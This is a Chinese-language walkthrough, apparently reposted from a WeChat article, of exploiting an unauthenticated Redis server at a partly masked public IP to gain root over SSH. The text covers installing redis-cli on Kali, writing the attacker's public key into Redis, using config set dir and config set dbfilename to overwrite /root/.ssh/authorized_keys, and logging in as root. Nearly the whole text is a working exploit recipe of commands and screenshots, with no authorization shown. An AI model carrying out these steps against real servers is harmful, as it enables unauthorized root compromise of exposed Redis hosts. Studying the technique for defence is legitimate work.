# redis未授权访问配合ssh免密登录getshell

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg2NDYwMDA1NA==&mid=2247520403&idx=1&sn=4d97a7091b00bbc33d1fce081af3151a&chksm=ce643a0af913b31c9b3c26ae30c6ef723727fe154eca789448e2b7212539ba344db22588e563&scene=126&sessionid=1681667489#rd](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247520403&idx=1&sn=4d97a7091b00bbc33d1fce081af3151a&chksm=ce643a0af913b31c9b3c26ae30c6ef723727fe154eca789448e2b7212539ba344db22588e563&scene=126&sessionid=1681667489#rd)

  

在一次渗透测试中拿到一个ip地址52.80.249.xx，nmap端口扫描出22，6379，80端口，目标机是linux系统的一台服务器，6379为redis的默认端口，尝试对其进行利用。使用kali作为攻击机

## 一、环境准备

1.1、在攻击机上面下载redis

wget http://download.redis.io/releases/redis-2.8.17.tar.gz

![](../Images/c52bc66655f9ee948ec27b9bef3499dc.png)

1.2解压文件，执行文件

解压文件：tar xzf redis-2.8.17.tar.gz

进入redis目录：cd redis-2.8.17

安装：make![](../Images/074c6ff839dab84180be3ec11b2186a9.png)

1.3、进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样以后启动redis就不用进入安装目录了）

cd src

cp redis-server /usr/bin

cp redis-cli /usr/bin

![](../Images/9f8b62d15a3016ae08ce31d7b213e7a2.png)

1.4、、返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下

cd ../

cp redis.conf /etc/![](../Images/5d0eb85b9d2ff8c3abbf105c4c9f7424.png)

1.5、使用/etc/目录下的reids.conf文件中的配置启动redis服务：

redis-server /etc/redis.conf

![](../Images/d8d34408508bde742c314333a89d0b5c.png)

1.6、然后ctrl+c退出，再次进入src目录然后连接目标靶机的redis服务

ctrl+c

cd src

redis-cli –h 52.80.249.xx

![](../Images/cbeeb75d5e3490a2d5952675ee23722f.png)

出现52.80.249.xx:6379>就代表连接成功，并且没有输入密码

## 二、漏洞利用

2.1、这里附上一个这里没法利用的一种 攻击方式截图（没有测试仅供参考）

![](../Images/10076bd64cb52fffc1bd10491598ac9c.png)

2.2、我们这里是不知道路径的，根据前期信息收集知道还有ssh服务的22端口是开放的，可以利用“公私钥”认证获取root权限

使用ssh生成公钥和私钥文件

ssh-keygen -t rsa

![](../Images/70b32fb3d692847a84f8385c59b2fb03.png)

2.3、进入.ssh文件下，将上面生成的公钥保存到1.txt里面

cd /root/.ssh

(echo -e "\\n\\n";cat id\_rsa.pub; echo -e "\\n\\n") > 1.txt

![](../Images/f8c1c25da277e81dc30de34d7f43727a.png)

2.4、将生成的公钥文件通过redis上传到目标服务器

cat 1.txt | redis-cli -h 52.80.249.xx -x set crack

![](../Images/9798490d2d5fb6a1341e5ff392e1d62c.png)

2.5、远程连接redis服务

redis-cli -h 52.80.249.xx

![](../Images/d7969e0ef09ecae573d0535967527c63.png)

2.6、获得redis备份的路径

config get dir![](../Images/0c3d5eaffcc9485cae98b60d0a70c96d.png)

2.7、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）：

![](../Images/7d59c0534eadbbccb321c4458641d053.png)

2.8、设置上传公钥的备份文件名字为authorized\_keys：

config set dbfilename authorized\_keys

![](../Images/e1c02443969c454a4325e3739cf7dd8d.png)

2.9、检查是否更改成功（查看有没有authorized\_keys文件），没有问题就保存然后退出，至此成功写入ssh公钥到靶机

config get dbfilename

![](../Images/406962412fe2fd3d2737371854859007.png)

2.10、攻击机直接ssh连接目标服务器

ssh -i id\_rsa root@52.80.249.xx

![](../Images/b05a1573488ef83ceff89d7a2e08646c.png)
